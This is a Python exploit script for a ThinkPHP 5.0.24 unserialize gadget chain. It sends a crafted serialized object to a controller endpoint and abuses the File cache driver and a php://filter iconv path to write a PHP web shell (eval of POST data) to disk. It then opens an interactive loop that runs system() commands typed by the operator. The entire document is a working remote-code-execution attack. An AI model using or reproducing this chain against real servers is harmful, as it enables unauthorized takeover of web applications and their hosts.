from base64 import b64encode, b64decode
from hashlib import md5
from phpserialize import namespace, serialize
from requests import session

ses = session()

'''
Arbitrary file write on think php 5.0.24
implemented by Frank
'''

TARGET = 'http://localhost'
FILE_PREFIX = '?<hp pvela$(P_SO[T]a;)>?'
# echo "<?echo iconv('ucs-2le', 'ucs-2be', '<?php eval(\$_POST[a]);?>');" | php
# 注意目录不一样时补齐2的倍数位

unserialize = lambda payload: ses.get('/public/index/Index/hello', params={
    # application/controller/method
    'data': b64encode(payload.encode()).decode()
})


@namespace('think\\cache\\driver')
class File:
    protected_options = {
        'expire': 0,
        'cache_subdir': False,
        'prefix': '',
        'path': 'php://filter/' +
                'convert.iconv.ucs-2be.ucs-2le/' +
                'resource=/tmp/' + FILE_PREFIX,
        'data_compress': False,
    }
    protected_tag = 'asdf'


@namespace('think\\session\\driver')
class Memcached:
    protected_handler = File()


@namespace('think\\console')
class Output:
    private_handle = Memcached()
    protected_styles = ['getAttr']


@namespace('think\\db')
class Query:
    protected_model = Output()


@namespace('think\\model\\relation')
class HasOne:
    protected_selfRelation = False
    protected_query = Query()
    protected_bindAttr = ['no', '123']


@namespace('think\\model')
class Pivot:
    protected_append = ['getError']
    protected_error = HasOne()
    public_parent = Output()
    protected_selfRelation = False
    protected_query = Query()


@namespace('think\\process\\pipes')
class Windows:
    private_files = [Pivot()]


unserialize(serialize(Windows()))

tag_hash = md5(("tag_" + md5(
    File.protected_tag.encode()
).hexdigest()).encode()).hexdigest()

file = f'{FILE_PREFIX}{tag_hash}.php'

while True:
    print(ses.post(TARGET + file, data={
        'a': 'system($_POST[b]);',
        'b': input()
    }).text[102:-38])
